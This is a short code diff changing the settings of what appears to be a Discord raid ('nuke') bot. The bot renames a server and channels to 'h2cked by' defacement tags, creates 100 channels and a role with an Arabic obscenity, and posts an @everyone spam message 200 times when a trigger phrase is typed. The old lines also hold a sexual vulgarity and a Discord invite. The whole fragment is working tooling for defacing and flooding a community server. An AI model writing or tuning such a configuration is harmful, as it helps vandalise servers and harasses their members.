@@ -4,12 +4,12 @@ const path = require('path');
 require('dotenv').config();
 
 let config = {
-    serverName: " اه اه نيك اه",
-    channelName: "h2cked by Group #0006",
+    serverName: "h2cked by 7lm x nerwigy x v was here!",
+    channelName: "h2cked by Nerwigy X 7lm X 5.wy",
     channelCount: 100,
     roleName: "نيك",
     iconPath: "./icon.png",
-    spamMessage: "@everyone h2cked by group #0006 and rosace https://discord.gg/geCavXxuUW",
+    spamMessage: "@everyone h2cked by Nerwigy x 7lm x V was here!",
     spamCount: 200,
     triggerWord: "شغل يا ريس"
 };
